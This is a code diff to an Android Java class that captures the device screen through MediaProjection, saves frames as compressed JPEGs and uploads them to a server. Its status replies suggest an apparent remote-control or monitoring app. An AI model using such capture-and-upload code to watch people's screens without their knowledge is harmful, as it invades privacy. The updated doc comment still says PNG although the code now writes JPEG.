@@ -67,18 +67,18 @@ final class ScreenCap {
         }
     }
 
-    /** Captures one frame, uploads it as a PNG, tears the virtual display down. */
-    static String capture(Context ctx) {
+    /** Captures one frame to a JPEG file. Returns null when unavailable. */
+    static File frame(Context ctx) {
         MediaProjection mediaProjection = projection;
         if (mediaProjection == null) {
-            return "no projection — consent needed (open the app)";
+            return null;
         }
         ImageReader localReader = null;
         VirtualDisplay localDisplay = null;
         try {
             WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
             DisplayMetrics metrics = new DisplayMetrics();
-            if (Build.VERSION.SDK_INT >= 30) {
+            if (Build.VERSION.SDK_INT >= 30 && ctx.getDisplay() != null) {
                 ctx.getDisplay().getRealMetrics(metrics);
             } else if (wm != null) {
                 //noinspection deprecation
@@ -91,7 +91,7 @@ final class ScreenCap {
             localReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
             reader = localReader;
             localDisplay = mediaProjection.createVirtualDisplay(
-                    "screen", width, height, dpi,
+                    "frames", width, height, dpi,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                     localReader.getSurface(), null, null);
             display = localDisplay;
@@ -111,22 +111,18 @@ final class ScreenCap {
                 }
             }
             if (bitmap == null) {
-                return "capture timed out";
+                return null;
             }
-            File file = new File(ctx.getCacheDir(), "screen-" + System.currentTimeMillis() + ".png");
+            File file = new File(ctx.getCacheDir(), "screen-" + System.currentTimeMillis() + ".jpg");
             FileOutputStream out = new FileOutputStream(file);
-            bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 55, out);
             out.flush();
             out.close();
             bitmap.recycle();
-
-            boolean sent = Net.upload(ctx, file, file.getName(), "screen");
-            //noinspection ResultOfMethodCallIgnored
-            file.delete();
-            return sent ? "screenshot uploaded" : "screenshot captured, upload failed";
+            return file;
         } catch (Throwable exc) {
-            Log.e("capture: " + exc);
-            return "capture error: " + exc;
+            Log.d("frame: " + exc);
+            return null;
         } finally {
             if (localDisplay != null) {
                 localDisplay.release();
@@ -135,6 +131,18 @@ final class ScreenCap {
                 localReader.close();
             }
         }
+    }
+
+    /** Captures one frame and uploads it as a PNG. */
+    static String capture(Context ctx) {
+        File file = frame(ctx);
+        if (file == null) {
+            return "no projection — consent needed (open the app)";
+        }
+        boolean sent = Net.upload(ctx, file, file.getName(), "screen");
+        //noinspection ResultOfMethodCallIgnored
+        file.delete();
+        return sent ? "screenshot uploaded" : "screenshot captured, upload failed";
     }
 
     private static Bitmap toBitmap(Image image, int width, int height) {
